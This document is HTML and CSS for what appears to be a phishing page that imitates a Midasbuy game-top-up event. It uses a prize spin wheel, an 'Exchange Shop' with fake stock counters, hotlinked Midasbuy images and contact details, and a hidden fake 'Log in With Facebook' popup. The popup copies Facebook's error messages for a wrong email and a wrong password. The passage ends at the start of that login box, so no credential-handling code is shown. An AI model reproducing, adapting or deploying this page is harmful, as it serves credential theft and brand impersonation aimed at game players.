	border-radius: 15px;
}
.verify-box-navbar-form input::placeholder {
	color: #f1f1f0;
}
.verify-box-navbar-form select {
	background:url(img/verify-bg.png) no-repeat center center;
	background-size: 100% 100%;
	width: 95%;
	height: 40px;
	margin-left: 10px;
	margin-bottom: 4px;
	padding: 4px;
	padding-left: 10px;
	padding-right: auto;
	color: #f1f1f0;
	font-size:15px;
	font-family: laza;
	font-weight: 500;
	border: 2px solid #232323;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
	border-radius: 15px;
}
.verify-box-content {	
	background-size: 100% 100%;
	width: 93%;
	height: auto;
	margin-top: -1px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 20px;
	padding-top: 0px;
	padding-bottom: 25px;
	display: block;
}
.verify-box-content-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #fff;
	font-size: 18px;
    font-family:laza;
	font-weight: 500;
	text-align: center;
	display: block;
}
.verify-box-content-title i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #f1f1f0;
	margin-top: 29px;
	font-size: 100px;
	text-align: center;
}
.verify-box-content button {
	background: url(img/submit.png) no-repeat center center;
    background-size: 76% 77%;
    width: 55%;
    height: 55px;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 10px;
    padding: 9px;
    padding-top: 8px;
    padding-left: 20px;
    padding-right: 20px;
    color: #030303;
    font-size: 19px;
    font-family: laza;
    font-weight: 500;
    text-align: center;
    border: none;
    display: block;
}
.about-box-content {	
	background:url(img/aboutrules-sec.png) no-repeat center center;
	background-size:100% 100%;
	width: 96%;
	height: 120px;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 20px;	
	padding-left: auto;
	padding-right: auto;
	float: center;
	color: #000;
	display: block;
}
.about-box-content-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #000;
	font-size: 18px;
    font-family:laza;
	font-weight: 500;
	text-align: center;
	display: block;
}
.about-box-content-title i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #000;
	font-size: 100px;
	text-align: center;
}
.about-box-content button {
	background:url(img/button.png) no-repeat center center;
	background-size:100% 100%;
	width: 45%;
	height: 45px;	
	padding: 7px;
	margin-bottom: 20px;	
	margin-top: 20px;
	margin-right: 3px;	
	margin-left: -12px;	
	padding-left: 10px;	
	color: #000;
	font-size: 16px;
	font-family:laza;
	font-weight: 500;
	text-align: center;
	float:left;
	border: none;	
	display: block;
}
.processing-box-sec {	
	background: url(img/box.png) no-repeat center;
	background-size: 100% 100%;
	width: 98%;
	height: 350px;
	margin-left: auto;
	margin-right: auto;
	margin-top: 10px;
	margin-bottom: 15px;
	padding: 20px;
	padding-top: 10px;	
	padding-bottom: 2px;
	display: block;
}
.processing-box-sec-title {
	width: 95%;
    height: auto;
    margin-top: 28px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 16px;
    padding: 5px;
    padding-left: 22px;
    padding-bottom: 0px;
    color: #fff;
    font-size: 15px;
    font-family: laza;
    text-align: left;
    display: block;
}
figure {
	margin: 0;
	padding: 0;
	overflow: hidden;
}
.itemShine figure {
	position: relative;
}
.itemShine figure::before {
	background: -webkit-linear-gradient(left, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
	background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
	width: 50%;
	height: 100%;
	top: 0;
	left: -75%;
	position: absolute;
	z-index: 2;
	content: '';
	display: block;
	-webkit-transform: skewX(-25deg);
	transform: skewX(-25deg);
}
.itemShine figure::before {
	-webkit-animation: shine 2s infinite;
	animation: shine 2s infinite;
}
@-webkit-keyframes shine {
	100% {
		left: 125%;
		}
}
@keyframes shine {
	100% {
		left: 125%;
		}
}
.kanan {
	float: right;
}
.kiri {
	float: left;
}
.tengah {
	margin-left: auto;
	margin-right: auto;
	display: block;
}
::-webkit-scrollbar { 
    display: none;
    width: 0px;
}
.twitter-load {	
	background-size: 100% 100%;
	width: 93%;
	height: 388px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 20px;
	padding-top: 0px;
	padding-bottom: 25px;
	display: block;
}
.twitter-load-title {
	width: 95%;
	height: auto;
	margin-top: 70px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	padding-top: 90px;
	color: #fff;
	font-size: 18px;
    font-family:laza;
	font-weight: 500;
	text-align: center;
	display: block;
}
.twitter-load-title i {
	margin-top: 90px;
	padding-top: 15px;
	padding-bottom: 15px;
	color: #00acee;
	font-size: 50px;	
	text-align: center;
}
.fb-load {	
	background-size: 100% 100%;
	width: 93%;
	height: 304px;
	margin-top: -1px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 20px;
	padding-top: 0px;
	padding-bottom: 25px;
	display: block;
}
.fb-load img {		
	width: 50px;
	height: 50px;	
	margin-top: 215px;	
	margin-bottom: -55px;
}
.fb-load-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #999998;
	font-size: 18px;
    font-family:laza;
	font-weight: 500;
	text-align: center;
	display: block;
}
.fb-load-title i {
	margin-top: 200px;
	padding-top: 15px;
	padding-bottom: 15px;
	color: #999998;
	font-size: 30px;	
	text-align: center;
}
.event-notification {    
	   width:93%;
	   height:53px;
	   padding:7px;
	   margin-right: auto;
	   margin-left: auto;
    }
.event-notification-txt {
	padding-top: 10px;
    padding-left: 34px;
    color: #dbff85;
    font-size: 16px;
    font-family: Teko;
    font-weight: 550;
    text-align: left;
    float: left;
    }
.header {
	width: 100%;
	height: auto;
}
.header img {
	width: 100%;
	height: auto;
	margin-top: -0px;
	border-bottom: 0px solid #C3A4FE;
}
.banner-wrap {
	width: 100%;
	height: 200px;
	border-bottom: 1px solid;
	border-color: hsla(0,0%,100%,.050980392156862744);
}
.header-img {
	width: 100%;
	height: 100%;
	margin-top: -15px;
}
.menu-btn {
	background: none;
	outline: none;
	border: none;
	font-size: 20px;
	top: 0%;
	border-top-right-radius: 5px;
	border-top-left-radius: 5px;
	margin: 4px;
	padding: 5px;
	padding-left: 8px;
	padding-right: 8px;
	margin-top: 0px;
	font-family: laza;
	color: #fff;
	position: relative;
}
.menu-btn:hover {
	background: #3b5998;
	color: #00acee;
	text-shadow: 0px 0px 15px #00acee;
}
.box-crate-wrapper {
	background: none;
    width: 95%;
    height: auto;
	margin-left: auto;
	margin-right: auto;
	margin-top: 15px;
	padding-bottom: 15px;
	display: block;
}
.box-crate-wrapper-navbar {
	background: none;
	width: 100%;
	height: 40px;
	padding: 5px;
}
.box-crate-wrapper-navbar-menu {
	width: 100%;
	height: 30px;
	padding: 5px;
	display: inline-block;
}
.box-crate-wrapper-navbar-menu-txt {
	color: #dee8e8;
	font-size: 20px;
	font-family: Teko;
	font-weight: 500;
	text-align: right;
	line-height: 20px;
	margin-right: -13px;
	margin-top: -2%;
}
.box-crate-wrapper-navbar-menu img {
	width: 25px;
	height: 25px;
	margin-top: -5px;
	margin-right: 5px;
	float: left;
}
.box-crate-content {
	width: 100%;
	padding-left: 4px;
	padding-right: 4px;
}
.scroll {
	overflow:scroll;
	position:relative;
	width: 100%;
	height:500px;
	margin-top:10px;
	margin-left: auto;
	margin-right: auto;
	display: block;
	scrollbar-face-color:#ffbb40;
	scrollbar-shadow-color:#ffbb40;
	scrollbar-highlight-color:#ffbb40;
	scrollbar-3dlight-color:#ffbb40;
	scrollbar-darkshadow-color:#ffbb40;
	scrollbar-track-color:#ffbb40;
	scrollbar-arrow-color:#ffbb40;
}
.item {
	width: 29%;
	height: 110px;
	margin: 3px;
	margin-bottom: 1px;
	display: inline-block;
}
.item img {
	width: 100%;
    height: 100%;
}
.item div {
	width: 100%;
	height: 100%;
	border-radius: 3px 3px 0px 0px;
}
.item div:first-child {
	margin-left: 0;
}
.redeem-item-wrapper {
	margin-top: 10px;
}
.redeem-item-content {
	width: 97%;
	height: 80px;
	margin-left: auto;
	margin-right: auto;
	padding: 5px;
	display: block;
}
.redeem-item-content-name {
	padding-top: 13px;
	color: #fff;
	font-size: 14px;
	font-family: Roboto;
	text-align: left;
}
.redeem-item-content-description {
	width: auto;
	height: auto;
	padding-top: 5px;
	color: #FFC655;
	font-size: 14px;
	font-family: Roboto;
	text-align: center;
	float: left;
}
.redeem-item-content img {
	width: 68px;
	height: 68px;
	margin-right: 10px;
	border: 1px solid;
	border-color: hsla(0,0%,100%,.050980392156862744);
	float: left;
}
.redeem-item-content button {
	background: url(img/btn.png) no-repeat center center;
	background-size: 100% 100%;
	width: 110px;
	height: auto;
	margin-top: -15px;
	padding: 1px;
	padding-top: 3px;
	color: #000;
	font-size: 19px;
	font-family: Teko;
	font-weight: 550;
	text-align: left;
	border: none;
	border-top: 0px !important;
	outline: none;
	float: right;
	animation: bounce .4s infinite alternate;
}
.redeem-item-content button img {
	width: 15px;
	height: 15px;
	margin-top: 9px;
	margin-left: 20px;
	border: none !important;
	float: left;
}
.load-container {
    background: #080809 no-repeat center;
    width: 100%;
    height: 100%;
}
.lenzz-container {
    background: #080809 no-repeat center;
    background-size: 100% 100%;
    padding: 5px;
    width: 100%;
    margin-left: 0px;
    margin-right: 0px;
    height: auto;
    position: relative; 
}
.slider-container {
	margin-top: -0px;
	border: 1px solid black;
}
.popup-box-loading {
	width: 95%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	padding: 6px;
	color: #AAAAAA;
	font-size: 17px;
    font-family:laza;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-box-loading img {
	width: 45px;
	height: auto;
	margin-bottom: 20px;
	text-align: center;
	animation-name: spin;
    animation-duration: 400ms;
    animation-iteration-count: infinite;
    animation-timing-function: linear;
}
@keyframes spin {
    from {transform:rotate(0deg);}
    to {transform:rotate(360deg);}
}

.item4 {
	background: none;
	background-size:display;
	width: 46%;
    height: 77px;
	margin: 0px;
	margin-top: 5px;
	display: inline-block;
	border: 1.5px solid #000;
	border-radius: 0px;	
}
.item4 img {
	background-size:display;
	width: 100%;
    height: 100%; 
    border:none;       
    border-radius: 0px;
}
.item3 {
	background: none;
	background-size:display;
    width: 29.5%;
    height: 96px;
	margin: 0px;
	margin-top: 5px;	
	margin-bottom: 0px;
	display: inline-block;
	border: 1.5px solid #000;
	border-radius: 0px;	
}
.item3 img {
	background-size:display;
	width: 100%;
    height: 100%; 
    border:none;   
    border-radius: 0px;
}
.item5 {
	background: none;
	background-size:display;
    width: 21%;
    height: 77px;
	margin: 0px;
	display: inline-block;
	border: 1.5px solid #000;
	border-radius: 0px;	
}
.item5 img {
	background-size:display;
	width: 100%;
    height: 100%; 
    border:none;   
    border-radius: 0px;
}
.item2 {
	background: none;
	background-size:display;
    width: 22%;
    height: 76px;	
	margin: 0px;
    margin-top: 8px;
	display: inline-block;
	border: 1.5px solid #000;
	border-radius: 0px;	
}
.item2 img {
	background-size:display;
	width: 100%;
    height: 100%; 
    border:none;   
    border-radius: 0px;
}


.lenzz0 {
	background: none;
	background-size:display;
    width: 24.7%;
    height: 152px;	
	margin: 0px;
    margin-top: 13px;
	position: absolute;
	left: 4px;
	display: inline-block;
	border: none;
	border-radius: 0px;	
}
.lenzz0 img {
	background-size:display;
	width: 100%;
    height: 100%; 
    border:none;   
    border-radius: 0px;
	opacity: 0%;
}
.lenzz1 {
	background: none;
	background-size:display;
	width: 48.5%;
    height: 80px;
	margin: 0px;
	margin-top: 13px;
	left: 27.5%;
	position: absolute;
	display: inline-block;
	border: none;
	border-radius: 0px;	
}
.lenzz1 img {
	background-size:display;
	width: 100%;
    height: 100%; 
    border:none;       
    border-radius: 0px;
	opacity: 0%;
}
.lenzz2 {
	background: none;
	background-size:display;
    width: 22%;
    height: 109px;	
	margin: 0px;
    margin-top: 13px;
	right: 2.5px;
	position: absolute;
	display: inline-block;
	border: none;
	border-radius: 0px;	
}
.lenzz2 img {
	background-size:display;
	width: 100%;
    height: 100%;
    border:none;   
    border-radius: 0px;
	opacity: 0%;
}
.lenzz3 {
	background: none;
	background-size:display;
    width: 23.5%;
    height: 65px;
	margin: 0px;
	margin-top: 100px;
	left: 27.5%;
	position: absolute;
	display: inline-block;
	border: none;
	border-radius: 0px;	
}
.lenzz3 img {
	background-size:display;
	width: 100%;
    height: 100%; 
    border:none;   
    border-radius: 0px;
	opacity: 0%;
}
.lenzz4 {
	background: none;
	background-size:display;
    width: 23.5%;
    height: 65px;
	margin: 0px;
	margin-top: 100px;
	left: 52.5%;
	position: absolute;
	display: inline-block;
	border: none;
	border-radius: 0px;	
}
.lenzz4 img {
	background-size:display;
	width: 100%;
    height: 100%; 
    border:none;   
    border-radius: 0px;
	opacity: 0%;
}
.lenzz5 {
	background: none;
	background-size:display;
    width: 18%;
    height: 67px;
	position: absolute;
	top: 77.5%;
	left: 4px;
	display: inline-block;
	border: none;
	border-radius: 0px;	
}
.lenzz5 img {
	background-size:display;
	width: 100%;
    height: 100%; 
    border:none;   
    border-radius: 0px;
	opacity: 0%;
}
.lenzz6 {
	background: none;
	background-size:display;
    width: 18%;
    height: 67px;
	position: absolute;
	top: 77.5%;
	left: 20%;
	display: inline-block;
	border: none;
	border-radius: 0px;	
}
.lenzz6 img {
	background-size:display;
	width: 100%;
    height: 100%; 
    border:none;   
    border-radius: 0px;
	opacity: 0%;
}
.lenzz7 {
	background: none;
	background-size:display;
    width: 18%;
    height: 67px;
	position: absolute;
	top: 77.5%;
	left: 39%;
	display: inline-block;
	border: none;
	border-radius: 0px;	
}
.lenzz7 img {
	background-size:display;
	width: 100%;
    height: 100%; 
    border:none;   
    border-radius: 0px;
	opacity: 0%;
}
.lenzz8 {
	background: none;
	background-size:display;
    width: 18%;
    height: 67px;
	position: absolute;
	top: 77.5%;
	left: 58%;
	display: inline-block;
	border: none;
	border-radius: 0px;	
}
.lenzz8 img {
	background-size:display;
	width: 100%;
    height: 100%; 
    border:none;   
    border-radius: 0px;
	opacity: 0%;
}
.lenzz9 {
	background: none;
	background-size:display;
    width: 22%;
    height: 109px;	
	margin: 0px;
    top: 61%;
	right:2.5px;
	position: absolute;
	display: inline-block;
	border: none;
	border-radius: 0px;	
}
.lenzz9 img {
	background-size:display;
	width: 100%;
    height: 100%; 
    border:none;   
    border-radius: 0px;
	opacity: 0%;
}
.popup-box-alert-pricenam {
	width: 92%;
	height: auto;
	margin-top: 1px;
	margin-bottom: 10px;
	margin-left: auto;
	margin-right: auto;
	padding: 5px;
	color: #fff;
	font-size: 15px;
    font-family: sans-serif, Arial;
	font-weight: 400;
	text-align: left;
	line-height: 20px;
	display: block;
}
.popup-box-alert-pricenam span {
	color: #fff;
	font-size: 15px;
	padding-top:3px;
	float: right;
	font-family:sans-serif, Arial;
}
.popup-box-alert-pricenam img {
	width: 25px;
	height: 25px;
	float: right;
	margin-top: -2px;
	margin-right: 20px;
}
.popup-box-item-oncenam {
	width: 75px;
	height: 75px;
	margin: 1px;
	margin-left: -5px;	
	margin-top: 30px;	
	text-align: center;
	display: inline-block;
}
.popup-box-item-oncenam img {
	width:100%;
	height:100%;
}
.onceRewardsImgnam {
    width:75px;
    height:75px;
}
.popup-box-navbarnam {
	background: #151B3D;
	background-size:100% 100%;
	height: auto;
	padding-bottom: 6px;
	border-radius:5px 5px 0 0;
}
.popup-box-navbarnam img {	
	width:18px;
	height: auto;
	float:right;
	margin-top:14px;
	margin-right:15px;
	padding-bottom: 6px;
}
.popup-box-navbarznam img {	
	width:25px;
	height: auto;
	float:right;
	margin-top:14px;
	margin-right:15px;
	padding-bottom: 6px;
}
.popup-box-navbar-titlesnam {
	padding-top: 8px;
	color: #fff;
	font-size: 18px;
	margin-left:38px;
	margin-bottom:6px;
	font-family:dinm;
	font-weight: 500;
	text-align: center;
}
.popup-box-navbar-titlenam {
	padding-top: 18px;
	margin-left: 15px;
	color: #fff;
	font-size: 16px;
	margin-bottom:10px;
	font-family:dinm;
	font-weight: 300;
	text-align: left;
}
.popup-box-bgnam {
	background: #151B3D;
	background-size:100% 100%;
	width: 100%;
	border-top:1px solid #fff;
	margin-top: -1px;
	border-radius:0 0 5px 5px;
}	
@property --angle {
  syntax: '<angle>';
  initial-value: 0deg;
  inherits: false;
}
.popup-box-bgnam {
  --angle: 360deg;
  border-image: linear-gradient(var(--angle), #00c4de, #1b56ff, #00c4de, #1b56ff) 1;
  animation: 1s rotate linear infinite;
}
@keyframes rotate {
  to {
    --angle: 0deg;
  }
}	
.popup-box-bgnam label {
  width: 70%;
  float:left;
  text-align: left;
  padding-left: 10px;  
  margin-bottom: 8px;
  color: #fff;
  text-shadow:none;
  font-family:sans-serif, Arial;
  font-size:14px;
  display:inline-block;
}
.popup-box-bg-verifynam {
	background: #151B3D;
	background-size:100% 100%;
	width: 100%;
	border-top:1px solid #fff;
	margin-top: -1px;
}	
@property --angle {
  syntax: '<angle>';
  initial-value: 0deg;
  inherits: false;
}
.popup-box-bg-verifynam {
  --angle: 360deg;
  border-image: linear-gradient(var(--angle), #00c4de, #1b56ff, #00c4de, #1b56ff) 1;
  animation: 1s rotate linear infinite;
}
@keyframes rotate {
  to {
    --angle: 0deg;
  }
}	
.popup-box-bg-verifynam label {
  width: 70%;
  float:left;
  text-align: left;
  padding-left: 10px;  
  margin-bottom: 8px;
  color: #fff;
  text-shadow:none;
  font-family:sans-serif, Arial;
  font-size:14px;
  display:inline-block;
}
.popup-box-bgsnam label {
  width: 70%;
  float:left;
  text-align: left;
  padding-left: 10px;  
  margin-bottom: 8px;
  color: #fff;
  text-shadow:none;
  font-family:sans-serif, Arial;
  font-size:14px;
  display:inline-block;
}
.popup-box-alert-enternam {
	width: 89%;
	height: auto;
	margin-top: 10px;
	padding-top: 25px;
	margin-right: auto;
	margin-left: auto;
	padding-bottom: 20px;
	display: block;
}
.popup-box-alert-purchasenam {
	width: 95%;
	height: auto;
	margin-top: 10px;
	padding-top: 20px;
	display: block;
}
.popup-box-alert-purchase-contentnam {
	width: 100%;
	height: 30px;
	padding: 5px;
}
.popup-box-alert-purchase-contentnam {
	color: #fff;
	font-size: 18px;
	font-family: dinm;
	font-weight: 550;
	text-align: left;
	line-height: 20px;
}
.popup-box-alert-purchasenam img {
	width: 18px;
	height: 18px;
	margin-top: 5px;
	margin-right: 5px;
	float: left;
}
.lenzzbutton {
	background: url(img/spin.png) no-repeat center center;
	background-size: 100% 100%;
    width: 40%;
    height: 48px;
	margin-top: 40px;	
	margin-bottom: 1px;
	display: block;
	margin-left: auto;
    margin-right: auto;
	animation: bounce .5s infinite alternate;
}
.box {
    background: none;
    width: 100%;
    height: 250px;
    margin-left:auto;
    margin-right:auto;   
    margin-top: 50px; 
	margin-bottom: 10px;
	border: none;
	border-radius: 0px;
	position: relative;
	display: block;
}
.box-item {
    width: 93%;
	height:auto;			
	padding-left:0px;
	padding-top:22.5px;
	margin-left: auto;
	margin-right: 13px;	
}
.border_hadiah {
	border: 1px solid #ffd700;
	box-shadow: inset 0 0 12px 4px rgba(255, 210, 0, 0.8);
}
.itembutton {
	background-size:display;
    width: 40%;
    height: 48px;
	margin-top: -11px;	
	margin-bottom: 1px;
	display: block;
	margin-left: auto;
    margin-right: auto;
}
.itembutton img {
	background-size:display;
	width: 100%;
    height: 100%; 
}
.itembutton {
    animation: bounce .4s infinite alternate;
}
.item-nominal {	
	color: #fff;
	font-size: 13px;
	font-family: laza;
	text-align: right;
	position: absolute;
	padding-top: 55px;
	padding-left: 5px;
} 	 
@media only screen and (max-width:600px) {
    .containerLanding, .containerHome {
        width: 100%;
        height: auto;
        margin-top: -3px;
        margin-bottom: 0px;
		border: none;
        border-radius: 0px;
        padding: 0px;	
    }    
	.slider-container {
		margin-top: 0px;
		border: none;
	}
    .gallery-container {	             
        float: left;
        margin-top:-2px;  
        width:100%;
        height:auto;
        border: 0px solid #fff;       
    }
    .box-item {
    width: 93%;
    height:auto;			
	padding-left:0px;
	padding-top:22.5px;
	margin-left: auto;
	margin-right: 13px;	
}
    .scroll {
        height: 400px;
    }
    .event-title {
        height: 100px;  
        width: 100%;  
    }
    .event-notification {    
	   width:93%;
	   height:53px;
	   padding:7px;
	   margin-right: auto;
	   margin-left: auto;
    }
    .event-notification-text {
	   padding-top:11px;
	   font-family:laza;
	   font-size:16px;
    }
    .footer {
       border-left: none;
       border-right: none;
       border-top: none;
       border-bottom: none;
    }
    .popup-box-wrapper {
    width: 360;
    margin-top: 60%;
    }
	.popup-box-wrapperz {
    width: 360;
    margin-top: 60%;
    }
    .popup-box-wrappers {
    width: 360px;
    margin-top: 60%;
    }
    .popup-box-item {
	width: 22%;
    height: 86px;
    margin-top: 30px;
    }
    .popup-box-login-fb {
    margin-top: 10%;
    }
    .popup-box-login-twitter {
    margin-top: 10%;
    }
	.footer {
    background-position-y: calc(500 / 640 * 210vw);
    }
	.footer-socmed-box p {
	margin-top: 12px;
	}
	.event-notification {
	background: url(img/notif-timer.png) no-repeat center center;
    background-size: auto;
    background-size: 94% 100%;
    width: 85%;
    height: 48px;
    margin-left: auto;
    margin-right: auto;
    margin-top: -2px;
    margin-bottom: -82px;
    display: block;
	}
	.event-notification-txt {
	padding-top: 10px;
    padding-left: 34px;
    color: #dbff85;
    font-size: 16px;
    font-family: Teko;
    font-weight: 550;
    text-align: left;
    float: left;
  }
  .event-notification-timer {
	padding-top: 18px;
    padding-right: 4px;
    color: #ffff;
    font-size: 13px;
    font-family: Teko;
    font-weight: 550;
    text-align: left;
	margin-bottom: 13px;
    float: right;
	margin-top:-142px;
	margin-right:20px;
  }
  .notif {
    background: url(img/notif-timer.png) no-repeat center;
    background-size: auto;
    background-size: 85% 81%;
    width: 100%;
    height: 60px;
    margin-top: -3px;
    margin-bottom: 0px;
    padding: 6px;
    color: #ffff;
    border: none;
	}
	.item2 {
        width: 22%;
        height: 76px;
		margin: 0px;
        margin-top: 8px;
    }
    .item3 {
        width: 29.5%;
        height: 96px;
		margin: 0px;
		margin-top: 5px;
		margin-bottom: 0px;
    }
    .item4 {
        width: 46%;
        height: 77px;
        margin: 0px;
		margin-top: 5px; 
    }
    .item5 {
        width: 21%;
        height: 77px;
        margin: 0px;
    }
}
</style>
<div class="slider-container" style="display: none;">
    <div class="gallery-wrapper">
        <img src="img/header/header1.jpg" alt="" />
        <img src="img/header/header2.jpg" alt="" />
        <img src="img/header/header3.jpg" alt="" />
        <img src="img/header/header4.jpg" alt="" />
        <img src="img/header/header5.jpg" alt="" />
        <img src="img/header/header1.jpg" alt="" />
    </div>
    <div class="header-front">
        <img src="img/header/headerfronts.png" style="width:100%;">
    </div>
<div class="laz-container">
<div class="box">
<div class="box-item">
<center>
<div class="lenzz0" data-order="0">
</div>
<div class="lenzz1" data-order="1">
</div>
<div class="lenzz2" data-order="2">
</div>
<div class="lenzz3" data-order="3">
</div>
<div class="lenzz4" data-order="4">
</div>
<div class="lenzz5" data-order="5">
<div class="item-nominal">3</div>
</div>
<div class="lenzz6" data-order="6">
<div class="item-nominal">100</div>
</div>
<div class="lenzz7" data-order="7">
<div class="item-nominal">5</div>
</div>
<div class="lenzz8" data-order="8">
<div class="item-nominal">9</div>
</div>
<div class="lenzz9" data-order="9">
</div>
</div> <!--- box-item--->
</div> <!--- box --->
<div class="lenzzbutton" style="display: block;" onclick="go_spin();" onmousedown="buka.play();"></div>
</div> <!--- laz-container --->
<div class="box-nam">
<center>
<div class="taktahu" style="margin-top:0px;">
<img src="img/Panah.png"></img></div>  
</center>
<div class="label-events2">Exchange Shop</div>                
<center>
<div class="item-wrapper">
<div class="item-content1">
<img class="item-content1-img" src="img/reward/mt2.png">
<div class="item-nominalk">×2</div>
<div class="item-content-name" style="font-size:12px;">Remaining&ensp;:<b style="color:red;">&ensp;60000/60000</b> </div>
<div class="item-content-description-biru">Modification Materials</div>
<button type="button" class="BtnRedeemAfterLoginPlayid" onclick="open_namekexchange(this);" src="img/reward/mt.png" data-name="" data-id="" value="">
<center><div style="padding-top: 6px;color:#fff;height: 25px;">MAX REDEEM</div></button>
</div>
<div class="item-content1">
<img class="item-content1-img" src="img/reward/mt2.png">
<div class="item-nominalk">×4</div>
<div class="item-content-name" style="font-size:12px;">Remaining&ensp;:<b style="color:#ffffff;">&ensp;24792/60000</b> </div>
<div class="item-content-description-biru">Modification Materials</div>
<button type="button" class="BtnRedeemAfterLoginPlayid" onclick="open_itemReward_confirmationnam(this);" src="img/reward/mt2.png" data-name="Modification Materials" data-id="×4" value="180">
<img src="img/Token.png"><div style="padding-top: 5px;">180</div></button>
</div>
<div class="item-content1">
<img class="item-content1-img" src="img/reward/mt2.png">
<div class="item-nominalk">×9</div>
<div class="item-content-name"style="font-size:12px;">Remaining&ensp;:<b style="color:#ffffff;">&ensp;44159/60000</b> </div>
<div class="item-content-description-biru">Modification Materials</div>
<button type="button" class="BtnRedeemAfterLoginPlayid" onclick="open_itemReward_confirmationnam(this);" src="img/reward/mt2.png" data-name="Modification Materials" data-id="×9" value="700">
<img src="img/Token.png"><div style="padding-top: 5px;">700</div></button>
</div>
<div class="item-content1">
<img class="item-content1-img" src="img/reward/mt.png">
<div class="item-nominalk">×1</div>
<div class="item-content-name"style="font-size:12px;">Remaining&ensp;:<b style="color:red;">&ensp;60000/60000</b> </div>
<div class="item-content-description-ungu">Upgradable Materials</div>
<button type="button" class="BtnRedeemAfterLoginPlayid" onclick="open_namekexchange(this);" src="img/reward/mt.png" data-name="" data-id="" value="">
<center><div style="padding-top: 6px;color:#fff;height: 25px;">MAX REDEEM</div></button>
</div>
<div class="item-content1">
<img class="item-content1-img" src="img/reward/mt.png">
<div class="item-nominalk">×4</div>
<div class="item-content-name"style="font-size:12px;">Remaining&ensp;:<b style="color:#ffffff;">&ensp;23902/60000</b> </div>
<div class="item-content-description-ungu">Upgradable Materials</div>
<button type="button" onclick="open_itemReward_confirmationnam(this);" src="img/reward/mt.png" data-name="Materials" data-id="×4" value="2399">
<img src="img/Token.png"><div style="padding-top: 5px;">2399</div></button>
</div>
<div class="item-content1">
<img class="item-content1-img" src="img/reward/mt.png">
<div class="item-nominalk">×7</div>
<div class="item-content-name"style="font-size:12px;">Remaining&ensp;:<b style="color:red;">&ensp;60000/60000</b> </div>
<div class="item-content-description-ungu">Upgradable Materials</div>
<button type="button" class="BtnRedeemAfterLoginPlayid" onclick="open_namekexchange(this);" src="img/reward/mt.png" data-name="Materials" data-id="×7" value="35999">
<center><div style="padding-top: 6px;color:#fff;height: 25px;">MAX REDEEM</div></button>
</div>
</center>  
</div>
<div class="footer">
        <div class="footer-txt-join">Follow us on</div> <!--- footer-txt-follow --->
        <div class="footer-socmed-wrapperz">
            <img style="margin-left: -70px;" src="https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-fb-new.png">
            <img src="https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-ins-new.png">
            <img src="https://cdn.midasbuy.com/images/twitter.80d9b5e6.png">
            <img src="https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-youtube-new.png">
            <img src="https://cdn.midasbuy.com/images/Discord.8277bca0.png">
            <img src="https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-email-subscribe.png">
            <br>
            <img style="margin-left: -269px;" src="https://cdn.midasbuy.com/images/footer-tiktok-white.7743a9ae.png">
            <img src="https://cdn.midasbuy.com/images/footer-reddit.d66cdc0d.png">
        </div> <!--- footer-socmed-wrapper --->
        <div class="footer-feedback-wrapper">
            <a style="color:white; font-size:15px;line-height:30px;">Contact us</a><br>
            If you need customer service, please contact us at Midasbuy_help@midasbuy.com or click "Feedback" to get in touch with us.
            <br>
            <button type="button"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAMAAAAhxq8pAAAAQlBMVEVHcEz////////////////////////////////////////////////////////////////////////////////////1bZCPAAAAFXRSTlMAw0frB9hgdKb3IRLhVZiBxLZtzTnclD14AAAAdElEQVQYGWXBBw7DIBAEwD360Vz3/18NsaUoghkgpEkDNi42VC48jHJ2A5GTCATXKv94g4hrzyXxp5eSCKE9XbB81AbjqRCSR84Hh5RdJ6kQDrbhrD7gvjgohI9eHFxUfimEL5u650shXCiEC0XgIgImTgw+Jf0TyIGj0d0AAAAASUVORK5CYII=">Feedback</button>
        </div> <!--- footer-feedback-wrapper --->
        <div class="footer-copyright-wrapper">
            Terms of Service | Privacy Policy | Cookie Policy |
            <br>
            Cookies Preference
        </div> <!--- footer-copyright-wrapper --->
    </div> <!--- footer --->
</div> <!--- slider-container --->

<div class="load-container" style="display: block;">
<div class="popup-box-alert-checking" style="text-align: center;margin-top: 200px;">
<br><br><br><br><br><br><br><br><br><br>
<i class="fa-solid fa-circle-notch fa-spin" style="color: #ffffff;font-size: 40px;margin-bottom: 14px;"></i>
<br>
loading...
</div>
</div> <!--- slider-container --->

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onmousedown="tutup.play();" onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb"><img src="img/style-img/icon-facebook.png">
<div class="navbar-fb-text"> Log in With Facebook </div></div> <!--- navbar-fb-text --->
<div class="navbar-alert-fb email-fb">The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b></div> <!--- navbar-alert --->
<div class="navbar-alert-fb sandi-fb">The password that you've entered is incorrect. <b>Forgotten password?</b></div> <!--- navbar-alert --->
<div class="content-box-fb">
<img src="img/style-img/icon_2.jpg">
